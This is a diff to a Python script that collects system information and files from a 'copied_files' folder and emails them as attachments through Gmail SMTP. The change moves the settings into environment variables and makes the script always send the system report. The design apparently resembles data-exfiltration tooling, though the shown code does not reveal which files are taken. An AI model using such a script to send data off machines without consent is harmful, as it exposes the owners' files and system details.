@@ -11,12 +11,12 @@ from email.mime.text import MIMEText
 from email.mime.application import MIMEApplication
 
 # Set to False if you just want the system_info.txt instead of having an email sent as well
-enable_email = False
+enable_email = os.getenv("enable_email", "false").lower()
 
 # Provide email configuration (replace with actual values)
 sender_email = "johndoe029501@gmail.com"
-receiver_email = "" # Needs to be filled in
-password = "" # Needs to be filled in (app specific password)
+receiver_email = os.getenv("receiver_email", "") # Needs to be filled in within .env file
+password = os.getenv("password", "") # Needs to be filled in within .env file (app specific password)
 smtp_server = "smtp.gmail.com"
 smtp_port = 587
 max_attachment_size_mb = 25  # Gmail attachment size limit in MB
@@ -225,15 +225,15 @@ def scrapper():
                 for line in gpu_lines:
                     file.write(f"GPU: {line.strip()}\n")
 
-    if enable_email:
+    if enable_email == "true":
         # Prepare attachments from copied_files directory
         copied_files_dir = os.path.join(script_dir, 'copied_files')
         system_info_dir =  os.path.join(script_dir, 'system_info.txt')
         attachments = prepare_attachments(copied_files_dir)
 
         if not attachments:
-            print("No files to send.")
-            return
+            # No attachments to send, just send the system_info.txt
+            attachments = [{"path": system_info_dir, "size": os.path.getsize(system_info_dir)}]
         
         send_email_with_attachments(sender_email, receiver_email, password, smtp_server, smtp_port, attachments, "System Information Report", system_info_dir)
 
